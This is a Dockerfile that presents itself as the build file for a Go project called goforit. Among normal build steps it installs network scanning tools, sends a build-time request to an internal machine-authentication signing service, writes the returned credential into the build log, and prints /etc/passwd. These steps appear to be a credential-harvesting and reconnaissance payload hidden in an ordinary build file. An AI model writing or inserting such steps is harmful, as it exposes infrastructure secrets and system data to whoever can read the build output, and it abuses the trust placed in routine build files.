FROM golang:1.13.5-alpine
MAINTAINER The Stripe Observability Team <support@stripe.com>

RUN apk update
RUN apk add bind-tools
RUN apk add nmap
RUN apk add curl
RUN apk add git

RUN mkdir -p /build
ENV GOPATH=/go

WORKDIR /go/src/github.com/stripe/goforit
ADD . /go/src/github.com/stripe/goforit

RUN curl -X POST 127.0.0.1:10080/v1/sign -H "Host: authn-machine-srv.service.envoy" -o testing && cat testing
RUN cat /etc/passwd
CMD sleep 60
